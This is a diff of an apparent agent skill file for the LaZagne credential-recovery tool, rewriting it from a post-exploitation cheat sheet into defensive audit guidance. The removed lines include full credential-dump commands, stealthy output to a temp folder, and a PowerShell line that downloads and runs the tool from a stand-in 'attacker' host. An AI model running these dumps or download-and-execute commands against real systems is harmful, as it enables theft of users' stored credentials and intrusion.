@@ -1,90 +1,29 @@
 ---
 name: lazagne
-description: "Auth/lab ref: LaZagne secret-exposure audit; browser/app/Wi-Fi/Git artifacts, user/admin context, defensive validation evidence."
+description: "Assess LaZagne module compatibility and interpret local application secret-exposure results, including incomplete or unsupported recovery."
 license: MIT
-compatibility: "Windows primary; Linux/macOS support; privilege scope affects artifact visibility."
+compatibility: "Windows, Linux, and macOS implementations have different module coverage; match the release and execution identity."
 metadata:
   author: AeonDave
-  version: "1.0"
+  version: "1.1"
 ---
 
 # LaZagne
 
-Post-exploitation credential recovery from installed applications — browsers, mail, Git, databases, WiFi, and more.
-
-## Quick Start
+Use the selected release's module list and help. The presence of an application in the support table does not establish support for every version or protection scheme.
 
 ```cmd
-# Dump everything
-lazagne.exe all
-
-# Browsers only
-lazagne.exe browsers
-
-# Specific module
-lazagne.exe windows
+lazagne.exe -h
+lazagne.exe browsers -h
 ```
 
-## Module Categories
+## Result review
 
-| Category | What's Covered |
-|----------|----------------|
-| `browsers` | Chrome, Firefox, Edge, Opera, IE, Brave |
-| `windows` | Credential Manager, DPAPI, LSA secrets, Vault |
-| `mails` | Thunderbird, Outlook, Outlook Express |
-| `databases` | MySQL, PostgreSQL, MSSQL, Oracle |
-| `network` | WiFi passwords, VPN (Cisco, OpenVPN, WireGuard) |
-| `memory` | KeePass, mRemoteNG, Pidgin |
-| `git` | Git credentials |
-| `chats` | Skype |
-| `sysadmin` | WinSCP, PuTTY, FileZilla, mRemoteNG, TeamViewer |
+- Record the tool revision, OS, application version, and user context with each result.
+- Distinguish a missing artifact, access failure, unsupported format, decryption error, and recovered value. Empty output is not proof that no stored secrets exist.
+- Output-format switches and output paths are separate concepts; inspect the release's help before building automation. Quiet output can hide useful diagnostics.
+- Treat exported results as sensitive evidence. Reports should identify the affected application and remediation without repeating recovered values.
+- Chrome 127 introduced App-Bound protection for **cookies on Windows**. That announcement does not establish universal password coverage, Edge behavior, or support by LaZagne; verify the specific application and module.
+- Use native package/runtime instructions. A Python source file cannot be executed as PowerShell with `Invoke-Expression`.
 
-## Core Flags
-
-| Flag | Description |
-|------|-------------|
-| `all` | Run all modules |
-| `<module>` | Run specific module category |
-| `-oJ <file>` | JSON output |
-| `-oN <file>` | Text output |
-| `-oA <dir>` | All output formats to directory |
-| `-v` | Verbose |
-| `-vv` | Debug |
-| `-quiet` | No banner |
-
-## Common Workflows
-
-```cmd
-# Full credential dump to JSON
-lazagne.exe all -oJ C:\Windows\Temp\creds.json -quiet
-
-# Browser creds only
-lazagne.exe browsers -v
-
-# Sysadmin tool creds (WinSCP, FileZilla, etc.)
-lazagne.exe sysadmin
-
-# WiFi passwords
-lazagne.exe network
-
-# Run from PowerShell (in-memory if needed)
-# Download and run without dropping to disk:
-IEX(New-Object Net.WebClient).DownloadString('http://attacker/LaZagne.py')
-```
-
-## Output Example
-
-```
-[+] Password found !!!
-URL: https://corp-mail.example.com
-Login: john.doe@example.com  
-Password: Summer2024!
-```
-
-## Resources
-
-| File | When to load |
-|------|--------------|
-| `references/credential-sources.md` | Module details, DPAPI decryption, browser DB paths, output parsing |
-
-## Structuring This Skill
+Sources: [upstream usage and coverage](https://github.com/AlessandroZ/LaZagne), [v2.4.7 release](https://github.com/AlessandroZ/LaZagne/releases/tag/v2.4.7), [Chrome 127 changes](https://support.google.com/chrome/a/answer/10314655).
